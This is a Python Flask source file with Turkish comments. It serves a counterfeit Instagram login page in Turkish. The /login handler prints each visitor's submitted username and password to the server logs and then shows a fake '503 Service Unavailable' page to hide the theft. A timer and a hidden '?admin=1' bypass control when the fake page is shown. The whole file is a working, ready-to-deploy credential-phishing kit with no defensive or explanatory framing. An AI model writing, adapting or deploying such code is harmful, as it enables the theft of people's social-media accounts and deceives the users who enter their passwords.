import os
import time
from flask import Flask, request, render_template_string

app = Flask(__name__)

# Sunucunun başlama zamanı
START_TIME = time.time()

# --- SADECE YAZILI INSTAGRAM TASARIMI ---
HTML_KODU = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş Yap • Instagram</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
        .insta-label { font-size: 35px; font-weight: bold; margin-bottom: 30px; color: #262626; font-style: italic; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; font-size: 12px; }
        button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 14px; margin-top: 10px; }
        .footer { margin-top: 20px; font-size: 12px; color: #8e8e8e; }
    </style>
</head>
<body>
    <div class="box">
        <div class="insta-label">Instagram</div>
        <form method="POST" action="/login">
            <input type="text" name="u" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
            <input type="password" name="p" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
        <div class="footer">Şifreni mi unuttun?</div>
    </div>
</body>
</html>
"""

HATA_EKRANI = """<h1 style='text-align:center;margin-top:100px;font-family:sans-serif;'>503 Service Unavailable</h1><p style='text-align:center;'>Sunucu su an bakimda, lutfen daha sonra tekrar deneyin.</p>"""

@app.route('/')
def home():
    # Admin girişi için: siteadresi.com/?admin=1
    is_admin = request.args.get('admin') == '1'
    
    # Süreyi 120 saniyeye çıkardık
    gecen_sure = time.time() - START_TIME
    
    if gecen_sure > 120 and not is_admin:
        return HATA_EKRANI, 503
        
    return render_template_string(HTML_KODU)

@app.route('/login', methods=['POST'])
def login():
    # Verileri Render Logs ekranına yazdır
    print(f"\\n!!! VERI GELDI !!!")
    print(f"Kullanici: {request.form.get('u')}")
    print(f"Sifre: {request.form.get('p')}")
    print(f"-------------------\\n")
    return HATA_EKRANI, 503

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
